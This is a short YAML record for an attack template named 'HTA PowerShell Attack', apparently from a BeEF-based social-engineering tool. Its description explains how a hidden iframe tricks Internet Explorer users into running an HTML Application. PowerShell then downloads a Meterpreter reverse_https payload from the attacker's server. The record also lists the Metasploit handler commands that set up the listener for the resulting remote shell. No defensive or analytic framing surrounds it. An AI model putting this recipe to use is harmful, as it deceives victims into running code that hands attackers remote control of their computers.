--- !ruby/object:Template 
attributes: 
  id: 3
  campaign_id: 
  name: HTA PowerShell Attack
  description: "Tricks the user into opening and allowing the execution of an HTML Application (HTA), appended to the DOM into an hidden IFrame via BeEF (see social_engineering->hta_powershell module).<br>The payload is obviously InternetExplorer only (and on Windows targets with powershell installed, so from Windows Vista to more recent versions like 7 and 8). If the user allows execution, powershell is used to download the payload (by @mattifestation) from BeEF.<br><br> The default payload is windows/meterpreter/reverse_https, and the attack works on both x86 and x86_64 targets.<br><br>Before launching the module, do the following on Metasploit:<br>use exploit/multi/handler<br>set PAYLOAD windows/meterpreter/reverse_https<br>set LHOST x.x.x.x<br>set LPORT 443<br>set ExitOnSession false<br>set AutoRunScript post/windows/manage/smart_migrate<br>exploit -j -z"
  location: hta_powershell
  notes: created by antisnatchor
  created_at: 2014-08-1 17:58:45 Z
  updated_at: 2014-08-1 17:58:45 Z
